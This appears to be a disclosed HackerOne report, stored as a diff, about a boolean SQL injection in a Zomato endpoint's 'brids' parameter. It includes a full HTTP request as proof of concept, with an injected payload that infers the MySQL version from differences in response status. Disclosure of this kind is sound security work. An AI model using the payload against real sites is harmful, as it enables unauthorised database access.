@@ -1,0 +1,31 @@
+ReportLink:https://hackerone.com/reports/301257
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/gerben_javado
+ReportedTo:Zomato(zomato)
+BountyAmount:1000.0
+Severity:
+State:Closed
+DateOfDisclosure:29.03.2018 16:58:13
+
+Summary:
+@gerben_javado found that the parameter brids (which was a JSON array) was vulnerable to boolean SQL injection.
+
+##POC
+
+Requesting MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5 (hex == @@version) resulted in a 500 HTTP status and MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/4 resulted in a 200 HTTP status. Showing that the version of MySQL starts with a 5.
+
+```
+POST /████.php?res_id={RES_ID} HTTP/1.1
+Host: www.zomato.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0
+Accept: */*
+Accept-Language: nl,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID={SESSION_COOKIE};
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 102
+
+action=show_support_breakups&brids=["')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/5/**/%23"]
+```
+
+Thanks @gerben_javado for helping us in keeping @zomato secure :)
